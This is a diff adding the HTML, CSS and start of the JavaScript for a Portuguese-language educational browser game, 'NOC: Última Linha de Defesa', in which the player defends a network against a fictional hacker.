@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, user-scalable=no">
+<meta name="theme-color" content="#070d18">
+<title>NOC: Última Linha de Defesa</title>
+<meta name="description" content="Jogo de redes e segurança: religue o rack, monte ACLs, filtre BGP e derrote o hacker Z3R0 antes que a rede caia.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="NOC: Última Linha de Defesa">
+<meta property="og:description" content="Jogo de redes e segurança: cabeamento, sub-redes, firewall, BGP e resposta a incidente. Você é o analista de plantão contra o Z3R0.">
+<meta property="og:image" content="https://SEU-USUARIO.github.io/noc-defesa/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23070d18'/%3E%3Ctext x='32' y='42' font-size='26' font-family='monospace' font-weight='bold' text-anchor='middle' fill='%2300e0a8'%3ENOC%3C/text%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#070d18;--panel:#0f1a2c;--panel2:#15233a;--line:rgba(255,255,255,.1);
+  --text:#e6f1ff;--muted:#8a9bb8;--acc:#00e0a8;--bad:#ff4d6d;--warn:#ffd166;--z:#ff2e63;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){--bg:#070d18}}
+:root[data-theme="dark"]{--bg:#070d18}
+*,*::before,*::after{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{height:100%;background:var(--bg);scroll-padding-top:env(safe-area-inset-top,0px)}
+body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;overflow:hidden;user-select:none;-webkit-user-select:none}
+#app{height:100%;max-width:720px;margin:0 auto;position:relative;display:flex;flex-direction:column}
+.screen{display:none;flex-direction:column;height:100%;min-height:0}
+.screen.on{display:flex}
+button{font-family:inherit;cursor:pointer}
+.btn{background:linear-gradient(135deg,#00e0a8,#00b98a);color:#03130d;border:none;border-radius:14px;padding:14px 26px;font:800 14px 'Orbitron',monospace;letter-spacing:1px;box-shadow:0 6px 20px rgba(0,224,168,.25)}
+.btn:active{transform:scale(.97)}
+.btn.ghostb{background:var(--panel2);color:var(--text);border:1px solid var(--line);box-shadow:none}
+.iconbtn{flex:0 0 38px;width:38px;height:38px;border-radius:12px;background:var(--panel);border:1px solid var(--line);color:var(--text);font:700 16px system-ui}
+
+/* ---------- scene ---------- */
+.scene{position:relative;flex:0 0 auto;height:96px;overflow:hidden;border-bottom:1px solid var(--line);background:#0a1426;transition:height .5s cubic-bezier(.4,0,.2,1)}
+.scene.big{height:min(40vh,calc(min(100vw,720px) * .44))}
+.scene.title{height:min(36vh,calc(min(100vw,720px) * .44))}
+.scene svg{position:absolute;inset:0;width:100%;height:100%;display:block}
+.scene::after{content:'';position:absolute;inset:0;pointer-events:none;opacity:0;transition:opacity .25s}
+.scene.alarm::after{background:radial-gradient(ellipse at 50% 0%,rgba(255,46,99,.55),rgba(255,46,99,.1) 70%);animation:alarm .22s 4 alternate}
+.scene.okf::after{background:radial-gradient(ellipse at 50% 0%,rgba(0,224,168,.4),transparent 70%);opacity:1}
+@keyframes alarm{from{opacity:.2}to{opacity:1}}
+.caption{position:absolute;left:10px;top:8px;right:10px;font:700 10px 'Orbitron',monospace;letter-spacing:1px;color:#bfe9dd;text-shadow:0 1px 3px #000;z-index:2;display:flex;gap:6px;align-items:center}
+.caption i{width:6px;height:6px;border-radius:50%;background:var(--acc);box-shadow:0 0 6px var(--acc);animation:blink 1s infinite;flex:0 0 6px}
+.skip{position:absolute;right:10px;bottom:8px;font:700 9px 'Orbitron',monospace;letter-spacing:1px;color:var(--muted);z-index:2;display:none}
+.scene.big .skip{display:block}
+.led{animation:blink 1.3s infinite}
+.redled{animation:blink .35s infinite}
+@keyframes blink{50%{opacity:.2}}
+.scroll{animation:scrollup 2.6s linear infinite}
+@keyframes scrollup{to{transform:translateY(-24px)}}
+.graph{stroke-dasharray:5 3;animation:dash .8s linear infinite}
+@keyframes dash{to{stroke-dashoffset:-16}}
+.glitch{animation:glitch 2.4s infinite}
+@keyframes glitch{0%,90%,100%{transform:none;opacity:1}92%{transform:translateX(3px);opacity:.6}94%{transform:translateX(-3px)}96%{opacity:.8}}
+.lamp{animation:lamp 4s infinite}
+@keyframes lamp{0%,100%{opacity:.55}50%{opacity:.8}}
+.hero{transition:transform 1.4s linear}
+.hero .bob{transform-box:fill-box;transform-origin:50% 100%}
+.hero .legL,.hero .legR,.hero .armL,.hero .armR{transform-box:fill-box;transform-origin:50% 8%}
+.hero.walk .legL{animation:swing .34s ease-in-out infinite alternate}
+.hero.walk .legR{animation:swing .34s ease-in-out infinite alternate-reverse}
+.hero.walk .armL{animation:swing .34s ease-in-out infinite alternate-reverse}
+.hero.walk .armR{animation:swing .34s ease-in-out infinite alternate}
+.hero.walk .bob{animation:bob .17s infinite alternate}
+.hero.type .armR{animation:typing .22s infinite alternate}
+.hero.type .armL{animation:typing .26s infinite alternate-reverse}
+.hero.idle .bob{animation:breathe 2.2s infinite}
+.hero.hit .bob{animation:hitk .45s}
+.hero.happy .bob{animation:jump .5s}
+@keyframes swing{from{transform:rotate(24deg)}to{transform:rotate(-24deg)}}
+@keyframes bob{to{transform:translateY(-1.5px)}}
+@keyframes typing{from{transform:rotate(-72deg)}to{transform:rotate(-56deg)}}
+@keyframes breathe{50%{transform:scaleY(1.015)}}
+@keyframes hitk{20%{transform:translateX(-3px) rotate(-6deg)}50%{transform:translateX(3px) rotate(4deg)}80%{transform:translateX(-2px)}}
+@keyframes jump{40%{transform:translateY(-9px)}}
+
+.scene.defeat .glitch{transform-box:fill-box;transform-origin:50% 50%;animation:zdie 1.1s forwards}
+@keyframes zdie{0%{transform:none}15%{transform:translateX(5px) skewX(14deg)}30%{transform:translateX(-6px);opacity:.5}45%{transform:translateX(3px) skewX(-10deg);opacity:1}70%{transform:scaleY(.08);opacity:1}100%{transform:scale(0,0);opacity:0}}
+.scene .zdef{opacity:0}
+.scene.defeat .zdef{animation:zon .4s 1s forwards}
+@keyframes zon{to{opacity:1}}
+.scene.defeat .scrframe{stroke:#00e0a8;transition:stroke .3s 1s}
+.hero.cheer .bob{animation:jump .55s infinite}
+.hero.cheer .armL{transform:rotate(150deg)}
+.hero.cheer .armR{transform:rotate(-150deg)}
+.sndbtn{flex:0 0 38px}
+.credit{margin-top:14px;font-size:11px;color:var(--muted)}
+.credit b{color:#c9d6ea;font-weight:600}
+/* ---------- title ---------- */
+#title .content{flex:1;overflow-y:auto;display:flex;flex-direction:column;align-items:center;text-align:center;padding:18px 22px 24px}
+.logo{font:800 42px 'Orbitron',monospace;letter-spacing:5px;background:linear-gradient(90deg,#00e0a8,#4dd2ff);-webkit-background-clip:text;background-clip:text;color:transparent;margin:4px 0 0}
+.slogan{font:600 11px 'Orbitron',monospace;letter-spacing:3px;color:var(--muted);margin:6px 0 16px}
+.story{max-width:390px;color:#c9d6ea;font-size:14px;line-height:1.6;margin:0 auto 20px}
+.reset{background:none;border:none;color:var(--muted);font-size:12px;margin-top:16px;text-decoration:underline}
+
+/* ---------- map ---------- */
+.mapTop{display:flex;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}
+.mapTop .av{width:44px;height:44px}
+.mapTop .who{flex:1}
+.mapTop .who b{display:block;font:800 12px 'Orbitron',monospace;letter-spacing:1px}
+.mapTop .who span{font-size:12px;color:var(--muted)}
+.starsTot{text-align:right;font:800 13px 'Orbitron',monospace;color:var(--warn)}
+.starsTot small{display:block;font:600 10px 'Orbitron',monospace;color:var(--muted);margin-top:2px}
+.mapList{flex:1;overflow-y:auto;padding:4px 14px 30px;min-height:0}
+.acth{margin:22px 0 10px}
+.acth span{font:800 10px 'Orbitron',monospace;letter-spacing:2px;color:var(--acc)}
+.acth b{display:block;font-size:16px;margin-top:3px}
+.path{position:relative}
+.path::before{content:'';position:absolute;left:21px;top:22px;bottom:22px;width:2px;background:linear-gradient(#1f6b58,#223350)}
+.node{position:relative;display:flex;gap:12px;align-items:center;background:none;border:none;width:100%;padding:5px 0;color:var(--text);text-align:left}
+.node .dot{position:relative;z-index:1;flex:0 0 44px;height:44px;border-radius:50%;background:var(--panel);border:2px solid #2c3d5c;display:flex;align-items:center;justify-content:center;font:800 14px 'Orbitron',monospace;color:var(--muted)}
+.node .info{flex:1;min-width:0;display:flex;align-items:center;gap:10px;background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:11px 12px}
+.node .tx{flex:1;min-width:0}
+.node .tx b{display:block;font-size:15px}
+.node .tx small{font:700 9.5px 'Orbitron',monospace;letter-spacing:1px;color:var(--muted)}
+.node .res{text-align:right;flex:0 0 auto}
+.node .res .st{color:var(--warn);font-size:14px;letter-spacing:1px}
+.node .res small{display:block;font:600 10px 'JetBrains Mono',monospace;color:var(--muted);margin-top:2px}
+.node.done .dot{background:#0d3a31;border-color:var(--acc);color:var(--acc)}
+.node.next .dot{border-color:var(--warn);color:var(--warn);animation:pulse 1.4s infinite}
+.node.next .info{border-color:rgba(255,209,102,.5);background:linear-gradient(90deg,rgba(255,209,102,.08),var(--panel))}
+.node.next .tag{display:inline-block;font:800 9px 'Orbitron',monospace;letter-spacing:1px;color:#1a1300;background:var(--warn);border-radius:6px;padding:2px 6px;margin-left:6px;vertical-align:2px}
+.node.lock{opacity:.38}
+.node.boss .dot{border-color:var(--z);color:var(--z)}
+.node.boss .info{border-color:rgba(255,46,99,.4)}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,209,102,.5)}100%{box-shadow:0 0 0 12px rgba(255,209,102,0)}}
+
+/* ---------- game ---------- */
+.top{display:flex;align-items:center;gap:8px;padding:9px 10px;border-bottom:1px solid var(--line);background:#0a1222}
+.hp{flex:1;min-width:0}
+.hp .l{display:flex;justify-content:space-between;gap:8px;font:700 9.5px 'Orbitron',monospace;letter-spacing:1px;color:var(--muted);margin-bottom:5px}
+.hp .l b{color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.hp .l span{white-space:nowrap}
+.hpbar{height:8px;background:#1b2740;border-radius:99px;overflow:hidden}
+.hpfill{height:100%;width:100%;background:linear-gradient(90deg,#00e0a8,#4dd2ff);transition:width .35s}
+.hpfill.low{background:linear-gradient(90deg,#ff4d6d,#ffb020)}
+.score{flex:0 0 auto;text-align:right;min-width:62px}
+.score b{display:block;font:800 13px 'JetBrains Mono',monospace}
+.score span{font:800 9px 'Orbitron',monospace;letter-spacing:1px;color:var(--warn);opacity:0;transition:.2s}
+.score span.on{opacity:1}
+.score span.pop{animation:pop .3s}
+.stage{flex:1;overflow-y:auto;padding:14px;min-height:0;position:relative;transition:opacity .45s,transform .45s}
+.veil{opacity:0!important;transform:translateY(14px);pointer-events:none}
+.shk{animation:shake .35s}
+.bank{flex:0 0 auto;max-height:40%;overflow-y:auto;padding:10px 12px 14px;background:var(--panel);border-top:1px solid var(--line);display:flex;flex-wrap:wrap;gap:8px;align-content:flex-start;transition:opacity .45s}
+.bankh{flex:0 0 100%;display:flex;justify-content:space-between;font:700 9px 'Orbitron',monospace;letter-spacing:1.5px;color:var(--muted)}
+.task{background:var(--panel2);border-left:3px solid var(--acc);border-radius:10px;padding:12px 14px;font-size:14px;line-height:1.55;color:#d7e3f5;margin-bottom:14px}
+.task b{color:var(--text)}
+
+.chip{touch-action:none;padding:9px 12px;border-radius:10px;background:#1c2d4a;border:1px solid #2d4670;font:600 13px 'JetBrains Mono',ui-monospace,monospace;color:#e6f1ff;cursor:grab;line-height:1.35;box-shadow:0 2px 0 #0b1426}
+.chip.sel{outline:2px solid var(--acc);outline-offset:1px;background:#1e3b4a}
+.chip.used{display:none}
+.chip.dragging{opacity:.25}
+.ghost{position:fixed;z-index:99;pointer-events:none;transform:translate(-50%,-135%) scale(1.06) rotate(-2deg);box-shadow:0 12px 26px rgba(0,0,0,.6);max-width:80vw}
+.zone.slot{display:inline-flex;min-width:58px;min-height:32px;padding:4px 8px;border:2px dashed #3a5680;border-radius:8px;align-items:center;justify-content:center;color:var(--muted);font:600 12.5px 'JetBrains Mono',monospace;vertical-align:middle;margin:2px 0;transition:background .15s,border-color .15s}
+.zone.slot.wide{display:flex;flex:1;justify-content:flex-start;min-height:42px;font-size:12px}
+.zone.hover{border-color:var(--acc)!important;background:rgba(0,224,168,.12)!important;transform:scale(1.03)}
+.zone.ok{border-style:solid;border-color:var(--acc);color:var(--acc);background:rgba(0,224,168,.08)}
+.bad{animation:shake .35s;border-color:var(--bad)!important;box-shadow:0 0 0 2px rgba(255,77,109,.35)}
+.pop{animation:pop .32s}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+@keyframes pop{50%{transform:scale(1.08)}}
+.tpl{font-size:14px;line-height:1.5}
+.kv{display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid var(--line);font-size:13px}
+.kv .grow{flex:1}
+.grid3{display:grid;grid-template-columns:auto 1fr 1fr;gap:8px 10px;align-items:center;margin-top:12px;font-size:13px}
+.grid3 .h{font:700 9px 'Orbitron',monospace;letter-spacing:1px;color:var(--muted)}
+.grid3 .zone.slot{width:100%}
+.ord{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.ord .n{flex:0 0 28px;height:28px;border-radius:8px;background:var(--panel2);display:flex;align-items:center;justify-content:center;font:800 12px 'Orbitron',monospace;color:var(--acc)}
+.cli{background:#050a12;border:1px solid var(--line);border-radius:10px;padding:12px;font:500 12.5px 'JetBrains Mono',monospace;line-height:2.4;color:#b8c7de;overflow-x:auto}
+.cli .c{color:#5f7394}
+.buckets{display:grid;gap:10px;grid-template-columns:repeat(auto-fit,minmax(140px,1fr))}
+.zone.bucket{border:2px dashed var(--bc);border-radius:14px;padding:10px;min-height:110px;background:color-mix(in srgb,var(--bc) 6%,transparent);transition:background .15s,transform .15s}
+.bucket .bh{font:800 11px 'Orbitron',monospace;letter-spacing:1px;color:var(--bc);margin-bottom:8px}
+.bucket .mini{font:500 11px 'JetBrains Mono',monospace;background:rgba(255,255,255,.06);border-radius:6px;padding:4px 6px;margin-top:5px;color:#d7e3f5;animation:pop .3s}
+
+/* ---------- wiring ---------- */
+.stepper{display:flex;align-items:center;gap:10px;background:var(--panel2);border-radius:12px;padding:10px 12px;margin-bottom:14px;border:1px solid var(--line)}
+.stepper .num{flex:0 0 30px;height:30px;border-radius:50%;background:var(--acc);color:#03130d;display:flex;align-items:center;justify-content:center;font:800 13px 'Orbitron',monospace}
+.stepper.two .num{background:var(--warn)}
+.stepper .txt{flex:1;font-size:13px;line-height:1.4}
+.stepper .txt b{color:var(--acc)}
+.stepper.two .txt b{color:var(--warn)}
+.stepper .cnt{font:800 10px 'Orbitron',monospace;letter-spacing:1px;color:var(--muted);text-align:right;white-space:nowrap}
+.stepper .cnt b{display:block;font-size:15px;color:var(--text)}
+.wire{position:relative;display:flex;gap:40px}
+.col{flex:1;min-width:0;display:flex;flex-direction:column;gap:10px}
+.colh{font:800 9.5px 'Orbitron',monospace;letter-spacing:1.5px;color:var(--muted);text-align:center;padding-bottom:2px}
+.port{position:relative;background:var(--panel);border:1.5px solid var(--line);border-radius:12px;padding:10px 10px 10px 10px;touch-action:none;min-height:74px;display:flex;flex-direction:column;justify-content:center;gap:5px;transition:border-color .15s,opacity .2s,transform .15s;cursor:pointer}
+.port .pic{display:flex;align-items:center;gap:6px}
+.port .pic svg{width:30px;height:19px;flex:0 0 30px}
+.port .t{font:700 11.5px 'JetBrains Mono',monospace;word-break:break-word;line-height:1.25}
+.port .s{font-size:10.5px;color:var(--muted);line-height:1.35}
+.port .up{display:none;font:800 8.5px 'Orbitron',monospace;letter-spacing:1px;color:#03130d;background:var(--acc);border-radius:5px;padding:2px 5px;align-self:flex-start}
+.port .st{position:absolute;top:8px;width:7px;height:7px;border-radius:50%;background:#34425c}
+.L .st{left:8px;display:none}.R .st{right:8px;display:none}
+.jack{position:absolute;top:50%;width:22px;height:22px;border-radius:50%;background:#0b1220;border:3px solid var(--jc);transform:translateY(-50%);display:flex;align-items:center;justify-content:center}
+.jack::after{content:'';width:8px;height:8px;border-radius:50%;background:var(--jc)}
+.L .jack{right:-12px}.R .jack{left:-12px}
+.L{padding-right:16px}.R{padding-left:16px}
+.port.sel{border-color:var(--acc);background:#10293a;transform:scale(1.02);box-shadow:0 0 0 3px rgba(0,224,168,.18)}
+.port.sel .jack{animation:pulseJ 1s infinite}
+@keyframes pulseJ{0%{box-shadow:0 0 0 0 rgba(0,224,168,.6)}100%{box-shadow:0 0 0 10px rgba(0,224,168,0)}}
+.picking .R:not(.done){border-color:rgba(255,209,102,.6);animation:cand 1.1s infinite}
+.picking .R.tgt{border-color:var(--warn);background:#2a2410;transform:scale(1.03)}
+.picking .L:not(.sel):not(.done){opacity:.4}
+@keyframes cand{50%{box-shadow:0 0 0 3px rgba(255,209,102,.18)}}
+.port.done{border-color:var(--jc);background:color-mix(in srgb,var(--jc) 7%,var(--panel));cursor:default}
+.port.done .up{display:inline-block}
+.port.done .st{display:block;background:var(--acc);box-shadow:0 0 8px var(--acc)}
+svg.wires{position:absolute;left:0;top:0;width:100%;height:100%;pointer-events:none;overflow:visible}
+.legend{display:flex;flex-wrap:wrap;gap:8px 14px;margin-top:16px;font-size:11px;color:var(--muted);background:var(--panel);border-radius:12px;padding:10px 12px}
+.legend span{display:inline-flex;align-items:center;gap:6px}
+.legend i{width:20px;height:5px;border-radius:3px;display:inline-block}
+
+/* ---------- quiz ---------- */
+.qmeta{font:700 10px 'Orbitron',monospace;letter-spacing:1.5px;color:var(--muted);margin-bottom:8px}
+.q{font-size:16px;line-height:1.5;margin-bottom:14px}
+.opt{display:block;width:100%;text-align:left;background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:13px 14px;margin-bottom:9px;color:var(--text);font:500 14px system-ui;animation:optin .35s both}
+.opt:nth-child(2){animation-delay:.05s}.opt:nth-child(3){animation-delay:.1s}.opt:nth-child(4){animation-delay:.15s}
+@keyframes optin{from{opacity:0;transform:translateX(-10px)}}
+.opt.right{border-color:var(--acc);background:rgba(0,224,168,.12)}
+.opt.wrong{border-color:var(--bad);background:rgba(255,77,109,.12)}
+.opt:disabled{cursor:default}
+.why{background:var(--panel2);border-radius:12px;padding:12px 14px;font-size:13px;line-height:1.55;color:#c9d6ea;margin-top:6px;animation:pop .3s}
+.why .btn{margin-top:12px;width:100%}
+.timer{height:6px;background:#1b2740;border-radius:9px;overflow:hidden;margin-bottom:12px}
+.timer div{height:100%;background:var(--warn);width:100%}
+.bossbar{display:flex;align-items:center;gap:10px;background:rgba(255,46,99,.08);border:1px solid rgba(255,46,99,.35);border-radius:12px;padding:10px;margin-bottom:14px}
+.bossbar .b{flex:1}
+.bossbar .b span{font:800 10px 'Orbitron',monospace;letter-spacing:1px;color:var(--z)}
+.bossbar .bb{height:8px;background:#2a0d18;border-radius:9px;overflow:hidden;margin-top:5px}
+.bossbar .bb div{height:100%;background:var(--z);transition:width .4s}
+
+/* ---------- toast / fx / modal ---------- */
+.toast{position:absolute;left:12px;right:12px;top:58px;z-index:40;display:flex;align-items:center;gap:10px;background:#1a0b12;border:1px solid rgba(255,46,99,.5);border-radius:14px;padding:8px 12px;opacity:0;transform:translateY(-8px);transition:.2s;pointer-events:none}
+.toast.good{background:#082019;border-color:rgba(0,224,168,.5)}
+.toast.show{opacity:1;transform:none}
+.toast .av{width:34px;height:34px;flex:0 0 34px}
+.toast .tt{font-size:13px;font-weight:600}
+#fx{position:fixed;inset:0;pointer-events:none;z-index:95;overflow:hidden}
+.pt{position:absolute;width:6px;height:6px;border-radius:2px;animation:pt .65s ease-out forwards}
+@keyframes pt{to{transform:translate(var(--dx),var(--dy)) scale(.2);opacity:0}}
+.ft{position:absolute;font:800 15px 'Orbitron',monospace;transform:translate(-50%,-50%);animation:ft 1s ease-out forwards;text-shadow:0 2px 6px #000;white-space:nowrap}
+@keyframes ft{to{transform:translate(-50%,-190%);opacity:0}}
+.modal{position:fixed;inset:0;z-index:80;background:rgba(3,6,12,.82);display:none;align-items:center;justify-content:center;padding:18px;padding-top:calc(18px + env(safe-area-inset-top,0px));padding-bottom:calc(18px + env(safe-area-inset-bottom,0px))}
+.modal.on{display:flex}
+.card{width:100%;max-width:420px;max-height:100%;overflow-y:auto;background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:18px;animation:cardin .3s}
+@keyframes cardin{from{opacity:0;transform:translateY(16px) scale(.97)}}
+.card h2{font:800 18px 'Orbitron',monospace;letter-spacing:1px;margin:0 0 4px}
+.card .tag{font:700 10px 'Orbitron',monospace;letter-spacing:1.5px;color:var(--muted)}
+.dlg{display:flex;gap:10px;align-items:flex-start;margin-top:14px}
+.dlg .av{width:46px;height:46px;flex:0 0 46px}
+.bubble{background:var(--panel2);border-radius:4px 14px 14px 14px;padding:10px 12px;font-size:14px;line-height:1.5}
+.bubble.z{border:1px solid rgba(255,46,99,.45)}
+.bubble.me{border:1px solid rgba(0,224,168,.4)}
+.bubble .who{display:block;font:800 9px 'Orbitron',monospace;letter-spacing:1.5px;margin-bottom:3px}
+.bubble.z .who{color:var(--z)}.bubble.me .who{color:var(--acc)}
+.goal{margin-top:14px;font-size:13px;color:#c9d6ea;background:rgba(0,224,168,.07);border-radius:10px;padding:10px 12px;line-height:1.5}
+.row{display:flex;gap:10px;margin-top:16px}
+.row .btn{flex:1;padding:13px 10px}
+.bigstars{font-size:40px;color:var(--warn);letter-spacing:6px;text-align:center;margin:10px 0 4px}
+.bigstars span{display:inline-block;animation:starin .4s both}
+.bigstars span:nth-child(2){animation-delay:.15s}.bigstars span:nth-child(3){animation-delay:.3s}
+@keyframes starin{from{transform:scale(0) rotate(-90deg);opacity:0}}
+.pts{display:flex;justify-content:space-between;font:600 12px 'JetBrains Mono',monospace;color:var(--muted);background:var(--panel2);border-radius:10px;padding:8px 12px;margin-top:8px}
+.pts b{color:var(--text)}
+.learn{font-size:13px;line-height:1.6;color:#c9d6ea;background:var(--panel2);border-radius:12px;padding:12px 14px;margin-top:10px}
+.learn b{display:block;font:800 10px 'Orbitron',monospace;letter-spacing:1.5px;color:var(--acc);margin-bottom:5px}
+</style>
+</head>
+<body>
+<div id="app">
+
+  <div class="screen on" id="title">
+    <div class="scene title" id="tScene"></div>
+    <div class="content">
+      <h1 class="logo">NOC</h1>
+      <div class="slogan">ÚLTIMA LINHA DE DEFESA</div>
+      <p class="story">03:12 da madrugada. O grupo <b style="color:var(--z)">Z3R0</b> invadiu o telão do NOC e lançou um ataque contra o provedor. Você é o analista de plantão. Religue o rack, feche o firewall e cace o invasor antes que a rede caia.</p>
+      <button class="btn" id="goMap">INICIAR TURNO</button>
+      <div class="row" style="justify-content:center;margin-top:12px"><button class="btn ghostb" id="sndT" style="flex:0 0 auto;padding:10px 16px;font-size:11px">SOM: ON</button></div>
+      <button class="reset" id="resetBtn">Zerar progresso</button>
+      <div class="credit">criado por <b>Marcos dos Anjos</b> · redes, infra e segurança</div>
+    </div>
+  </div>
+
+  <div class="screen" id="map">
+    <div class="mapTop">
+      <div class="av" id="mA"></div>
+      <div class="who"><b>ANALISTA DE PLANTÃO</b><span>Escolha o próximo incidente</span></div>
+      <div class="starsTot" id="starsTot"></div>
+      <button class="iconbtn sndbtn" id="sndM" aria-label="Som">♪</button>
+    </div>
+    <div class="mapList" id="mapList"></div>
+  </div>
+
+  <div class="screen" id="game">
+    <div class="top">
+      <button class="iconbtn" id="backBtn" aria-label="Voltar">←</button>
+      <div class="hp">
+        <div class="l"><b id="lvName">-</b><span id="hpTxt">REDE 100%</span></div>
+        <div class="hpbar"><div class="hpfill" id="hpFill"></div></div>
+      </div>
+      <div class="score"><b id="scoreTxt">0</b><span id="comboTxt">COMBO x2</span></div>
+      <button class="iconbtn" id="tipBtn" aria-label="Dica">?</button>
+    </div>
+    <div class="scene" id="scene"></div>
+    <div class="stage" id="stage"></div>
+    <div class="bank" id="bank"></div>
+    <div class="toast" id="toast"><div class="av" id="toastAv"></div><div class="tt" id="toastTxt"></div></div>
+  </div>
+</div>
+<div class="modal" id="modal"><div class="card" id="mcard"></div></div>
+<div id="fx"></div>
+
+<script>
+(() => {
+const $ = id => document.getElementById(id);
+const shuffle = a => { a = a.slice(); for (let i = a.length - 1; i > 0; i--) { const j = Math.random() * (i + 1) | 0; [a[i], a[j]] = [a[j], a[i]]; } return a; };
+const fmt = n => n.toLocaleString('pt-BR');
+
+// ---------- avatars ----------
+const AV_ME = `<svg viewBox="0 0 64 64" width="100%" height="100%"><circle cx="32" cy="32" r="32" fill="#12324a"/><path d="M11 64c2-12 10-18 21-18s19 6 21 18z" fill="#00a884"/><path d="M26 46l6 7 6-7" fill="#0b6e57"/><rect x="38" y="53" width="8" height="6" rx="1" fill="#e6f1ff"/><circle cx="32" cy="29" r="12" fill="#d9a77f"/><path d="M20 27c0-9 6-14 12-14s12 5 12 13c-3-4-8-6-12-6s-9 2-12 7z" fill="#2b1d14"/><rect x="24" y="26.5" width="7" height="5" rx="1.6" fill="rgba(160,220,255,.25)" stroke="#0b1220" stroke-width="1.4"/><rect x="33" y="26.5" width="7" height="5" rx="1.6" fill="rgba(160,220,255,.25)" stroke="#0b1220" stroke-width="1.4"/><path d="M31 28.5h2" stroke="#0b1220" stroke-width="1.4"/><path d="M28.5 35.5q3.5 2.5 7 0" stroke="#7a4a33" stroke-width="1.5" fill="none" stroke-linecap="round"/><path d="M19 30a13 13 0 0 1 26 0" fill="none" stroke="#1b2a44" stroke-width="3"/><rect x="16" y="27" width="5" height="9" rx="2" fill="#1b2a44"/><rect x="43" y="27" width="5" height="9" rx="2" fill="#1b2a44"/><path d="M19 35c0 5 4 8 9 8" stroke="#1b2a44" stroke-width="2" fill="none"/><circle cx="29" cy="43" r="2.2" fill="#00e0a8"/></svg>`;
+const AV_Z = `<svg viewBox="0 0 64 64" width="100%" height="100%"><circle cx="32" cy="32" r="32" fill="#2a0d18"/><path d="M8 64c0-22 9-42 24-46 15 4 24 24 24 46z" fill="#12050a"/><path d="M14 64c1-16 8-30 18-33 10 3 17 17 18 33z" fill="#1f0a12"/><ellipse cx="32" cy="35" rx="11" ry="13" fill="#e8e8ee"/><path d="M23 31l7 2.5-7 2.5z" fill="#ff2e63"/><path d="M41 31l-7 2.5 7 2.5z" fill="#ff2e63"/><path d="M26 42q6 4 12 0" stroke="#12050a" stroke-width="1.6" fill="none"/><path d="M28 44v2M32 45v2M36 44v2" stroke="#12050a" stroke-width="1.2"/></svg>`;
+$('mA').innerHTML = AV_ME;
+
+// ---------- scenes ----------
+const HERO = `<g class="hero" id="hero"><g class="bob">
+<ellipse cx="0" cy="0" rx="11" ry="2" fill="rgba(0,0,0,.4)"/>
+<g class="legL"><rect x="-6" y="-22" width="5.5" height="21" rx="2" fill="#1b2a44"/><rect x="-7" y="-3" width="8.5" height="3" rx="1.5" fill="#05080f"/></g>
+<g class="legR"><rect x="0.5" y="-22" width="5.5" height="21" rx="2" fill="#243556"/><rect x="0.5" y="-3" width="8.5" height="3" rx="1.5" fill="#05080f"/></g>
+<g class="armL"><rect x="-12" y="-43" width="4.5" height="17" rx="2.2" fill="#008f70"/><circle cx="-9.8" cy="-25" r="2.4" fill="#d9a77f"/></g>
+<rect x="-9" y="-45" width="18" height="25" rx="5" fill="#00a884"/>
+<path d="M-4 -45 L0 -40 L4 -45" fill="#0b6e57"/>
+<rect x="2.5" y="-37" width="5" height="4" rx=".6" fill="#e6f1ff"/>
+<g class="armR"><rect x="7.5" y="-43" width="4.5" height="17" rx="2.2" fill="#00a884"/><circle cx="9.8" cy="-25" r="2.4" fill="#d9a77f"/></g>
+<rect x="-2.5" y="-49" width="5" height="4" fill="#d9a77f"/>
+<circle cx="0" cy="-55" r="8" fill="#d9a77f"/>
+<path d="M-8 -56 C-8 -64 -2 -66 2 -65 C6 -64 9 -61 8 -56 C5 -60 0 -60 -8 -56Z" fill="#2b1d14"/>
+<rect x="1.5" y="-57.5" width="5.5" height="3.6" rx="1" fill="rgba(160,220,255,.35)" stroke="#0b1220" stroke-width=".9"/>
+<path d="M-8.5 -55 A8.6 8.6 0 0 1 8.2 -58.5" stroke="#1b2a44" stroke-width="1.8" fill="none"/>
+<rect x="-10.2" y="-58" width="3.6" height="6.5" rx="1.5" fill="#1b2a44"/>
+<path d="M-7 -52 C-6 -48 -1 -47 3 -48" stroke="#1b2a44" stroke-width="1.1" fill="none"/><circle cx="3.6" cy="-48" r="1.2" fill="#00e0a8"/>
+</g></g>`;
+const led = (x, y, c, d, cls = 'led') => `<circle class="${cls}" style="animation-delay:${d.toFixed(2)}s" cx="${x}" cy="${y}" r="1.3" fill="${c}"/>`;
+function lines(id, x, y, w, h, c) {
+  let s = `<clipPath id="${id}"><rect x="${x}" y="${y}" width="${w}" height="${h}"/></clipPath><g clip-path="url(#${id})"><g class="scroll">`;
+  const n = Math.ceil(h / 4) + 7;
